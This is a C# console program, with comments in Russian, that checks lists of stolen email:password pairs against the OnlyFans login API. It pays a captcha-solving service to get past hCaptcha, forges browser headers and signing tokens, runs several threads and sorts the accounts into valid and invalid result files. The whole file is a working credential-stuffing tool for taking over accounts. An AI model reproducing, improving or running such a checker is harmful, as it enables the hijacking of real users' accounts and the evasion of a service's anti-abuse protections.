using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using RestSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TwoCaptcha.Captcha;
using RuCaptcha = TwoCaptcha.TwoCaptcha;



enum CheckResult
{
    Valid,
    Invalid,
    InvalidEmail,
    WrongCaptcha,
    NeedRefreshPage,
    Error,
    UnknowError
}

namespace CheckerOnlyFans
{
    partial class Checker
    {
        #region Приватные поля
        private readonly string apiKey;
        private readonly RuCaptcha solver;
        #endregion

        #region Конструкторы
        public Checker(string apiKey)
        {
            this.apiKey = apiKey;
            solver = new RuCaptcha(apiKey);
        }
        #endregion


        #region Вспомогательные методы
        private static string base64Encode(string text)
        {
            var textBytes = Encoding.UTF8.GetBytes(text);
            return Convert.ToBase64String(textBytes);
        }
        private static long getTime()
        {
            return DateTimeOffset.Now.ToUnixTimeSeconds() * 1000 - 10000;
        }
        #endregion


        #region Получение ответа на капчи
        public async Task<string> GetInvisibleCaptcha()
        {

            HCaptcha captcha = new HCaptcha();
            captcha.SetSiteKey("314ec50a-c08a-4c0a-a5c4-4ed4c7ed5aff");
            captcha.SetUrl("https://onlyfans.com");

            try
            {
                await solver.Solve(captcha);
                return captcha.Code;
            }
            catch (Exception e)
            {
                Console.WriteLine("Ошибка получения ответа на невидимой капчи: " + e.Message);
                return null;
            }
        }

        public async Task<string> GetCaptcha()
        {
            HCaptcha captcha = new HCaptcha();
            captcha.SetSiteKey("7c8456cf-fb4e-48fc-a054-d97bc7765634");
            captcha.SetUrl("https://onlyfans.com");

            try
            {
                await solver.Solve(captcha);
                return captcha.Code;
            }
            catch (Exception e)
            {
                Console.WriteLine("Ошибка получения ответа на капчу: " + e.Message);
                return null;
            }
        }
        #endregion


        /// <summary>
        /// Проверка аккаунта на валидность
        /// </summary>
        /// <param name="email">Email</param>
        /// <param name="password">Пароль</param>
        /// <returns></returns>
        /// <exception cref="ArgumentException">Email или пароль пуст</exception>
        /// <exception cref="Exception">Не удалось решить капчу</exception>
        public async Task<CheckResult> Check(string email, string password)
        {
            #region Проверка аргументов на корректность
            if (string.IsNullOrEmpty(email) || string.IsNullOrEmpty(password))
            {
                throw new ArgumentException("Email или пароль пуст");
            }
            #endregion

            #region Запрос ответа на капчу
            Console.WriteLine($"Запущен чек аккаунта {email}:{password}");
            string hCaptchaPassiveResponse = await GetInvisibleCaptcha();
            string hCaptchaResponse = await GetCaptcha();
            #endregion


            #region Выброс ошибки, если капчу решить не удалось
            if (hCaptchaPassiveResponse == null || hCaptchaResponse == null)
            {
                throw new Exception("Не удалось решить капчу");
            }
            #endregion


            string encodedPassoword = base64Encode(password);//Шифроание пароля


            #region Попытка входа
            var client = new RestClient();
            var request = new RestRequest("https://onlyfans.com/api2/v2/users/login", Method.Post);

            #region Хедеры запроса
            request.AddHeader("authority", "onlyfans.com");
            request.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"");
            request.AddHeader("time", "1648337832999");
            request.AddHeader("sec-ch-ua-mobile", "?0");
            request.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36");
            request.AddHeader("app-token", "33d57ade8c02dbc5a333db99ff9ae26a");
            request.AddHeader("content-type", "application/json");
            request.AddHeader("accept", "application/json, text/plain, */*");
            request.AddHeader("x-bc", "8cbc13a64c96aa10eeb870b75a4deb1b17feb8ea");
            request.AddHeader("sign", "2893:e4dd23bd3dd12432d362bfc236bcfcffda6b824b:ef6:623dee62");
            request.AddHeader("sec-ch-ua-platform", "\"Windows\"");
            request.AddHeader("origin", "https://onlyfans.com");
            request.AddHeader("sec-fetch-site", "same-origin");
            request.AddHeader("sec-fetch-mode", "cors");
            request.AddHeader("sec-fetch-dest", "empty");
            request.AddHeader("referer", "https://onlyfans.com/");
            request.AddHeader("accept-language", "ru-RU,ru;q=0.9");
            #endregion

            #region Тело запроса
            string body = "{\"email\":\"" + email +
        "\",\"password\":\"" + password +
        "\",\"h-captcha-passive-response\":\"" + hCaptchaPassiveResponse +
        "\",\"h-captcha-response\":\"" + hCaptchaResponse +
        "\",\"encodedPassword\":\"" + encodedPassoword + "\"}";

            request.AddBody(body, "application/json");
            #endregion

            #region Получение ответа
            var response = await client.ExecuteAsync(request);
            string jsonText = response.Content;
            #endregion

            JObject json = JObject.Parse(jsonText);
            #endregion



            #region Если ошибка
            if (json.TryGetValue("error", out JToken error))
            {
                if (JObject.Parse(error.ToString()).TryGetValue("message", out JToken message))
                {
                    string messageText = message.ToString();
                    switch (messageText)
                    {
                        case "Wrong email or password":
                            return CheckResult.Invalid;
                        case "Please refresh the page":
                            return CheckResult.NeedRefreshPage;
                        case "Email is not valid":
                            return CheckResult.InvalidEmail;
                        case "Captcha wrong":
                            return CheckResult.WrongCaptcha;
                        default:
                            return CheckResult.Error;
                    }
                }
                else
                {
                    return CheckResult.UnknowError;
                }
            }
            #endregion
            #region Если вернулся ID пользователя
            else if (json.TryGetValue("userId", out JToken userId))
            {
                response = await GetMe(client);
                return CheckResult.Valid;
            }
            #endregion
            #region Если неизвестный результат
            else
            {
                return CheckResult.UnknowError;
            }
            #endregion
        }

        #region Нерабочий метод получения информации об аккаунте
        private async Task<RestResponse> GetMe(RestClient client)
        {
            var request = new RestRequest("https://onlyfans.com/api2/v2/users/me", Method.Get);
            request.AddHeader("authority", "onlyfans.com");
            request.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"");
            request.AddHeader("time", "1648302473696");
            request.AddHeader("sec-ch-ua-mobile", "?0");
            request.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36");
            request.AddHeader("app-token", "33d57ade8c02dbc5a333db99ff9ae26a");
            request.AddHeader("accept", "application/json, text/plain, */*");
            request.AddHeader("x-bc", "2aa2e70406358311b7caff03779ca3c0bd1741d4");
            request.AddHeader("sign", "2893:26dbd6b72e995d61af77e8558191ce03f968130b:cf8:623dee62");
            request.AddHeader("sec-ch-ua-platform", "\"Windows\"");
            request.AddHeader("sec-fetch-site", "same-origin");
            request.AddHeader("sec-fetch-mode", "cors");
            request.AddHeader("sec-fetch-dest", "empty");
            request.AddHeader("referer", "https://onlyfans.com/");
            request.AddHeader("accept-language", "ru-RU,ru;q=0.9");
            string cookies = "";
            foreach (var item in client.CookieContainer.GetCookies(new Uri("https://onlyfans.com/")))
            {
                cookies += $"{item}; ";
            }
            cookies.TrimEnd(' ');
            cookies.TrimEnd(';');
            request.AddHeader("cookie", cookies);

            var response = await client.ExecuteAsync(request);
            return response;
        }
        #endregion


    }

    internal class Program
    {
        
        static void Main(string[] args)
        {
            int threadCount = 1;
            do
            {
                Console.Clear();
                Console.WriteLine("Количество потоков(1-3):");

            } while (!int.TryParse(Console.ReadLine(), out threadCount) || threadCount < 1 || threadCount > 3);


            Run(threadCount);

        }

        private static void Run(int threadCount)
        {
            string resultDirName = $"result{Guid.NewGuid().ToString()}]";
            if(!Directory.Exists(resultDirName))
            {
                Directory.CreateDirectory(resultDirName);
            }
            string uncheckedFileName = "unchecked.txt";

            string invalidFileName = "invalid.txt";
            string invalidFilePath = $"{resultDirName}\\{invalidFileName}";

            string validFileName = "valid.txt";
            string validFilePath = $"{resultDirName}\\{validFileName}";

            string errorFileName = "error.txt";
            string errorFilePath = $"{resultDirName}\\{errorFileName}";

            Semaphore sem = new Semaphore(threadCount, threadCount);
            Config config = new Config();

            Checker checker = new Checker(config.ApiKey);
            List<(string, string)> data = new List<(string, string)>();
            List<(string, CheckResult)> accounts = new List<(string, CheckResult)>();

            if (File.Exists(uncheckedFileName))
            {
                foreach (var line in File.ReadAllLines(uncheckedFileName))
                {
                    if (line.Contains(':'))
                    {
                        var acc = line.Split(':');
                        data.Add((acc.FirstOrDefault(), acc.LastOrDefault()));
                    }
                }
                Console.WriteLine($"Загружено валидных строк: {data.Count}");
            }
            else
            {
                Console.WriteLine($"Файл {uncheckedFileName} не найден.");
            }

            List<Task> tasks = new List<Task>();

            foreach (var item in data)
            {
                Task temp = Task.Run(async () =>
                {

                    sem.WaitOne();
                    var result = await checker.Check(item.Item1, item.Item2);

                    switch (result)
                    {
                        case CheckResult.Valid:
                            Console.WriteLine($"{item.Item1}:{item.Item2} Валид");
                            using (StreamWriter writer = new StreamWriter(validFilePath, true))
                            {
                                await writer.WriteLineAsync($"{item.Item1}:{item.Item2}");
                            }
                            break;
                        case CheckResult.Invalid:
                            Console.WriteLine($"{item.Item1}:{item.Item2} Невалид");
                            using (StreamWriter writer = new StreamWriter(invalidFilePath, true))
                            {
                                await writer.WriteLineAsync($"{item.Item1}:{item.Item2}");
                            }
                            break;
                        default:
                            Console.WriteLine($"{item.Item1}:{item.Item2} Ошибка");
                            using (StreamWriter writer = new StreamWriter(errorFilePath, true))
                            {
                                await writer.WriteLineAsync($"{item.Item1}:{item.Item2}:{result}");
                            }
                            break;
                    }

                    sem.Release();

                });
                tasks.Add(temp);
            }
            Task.WaitAll(tasks.ToArray());
        }
    }
}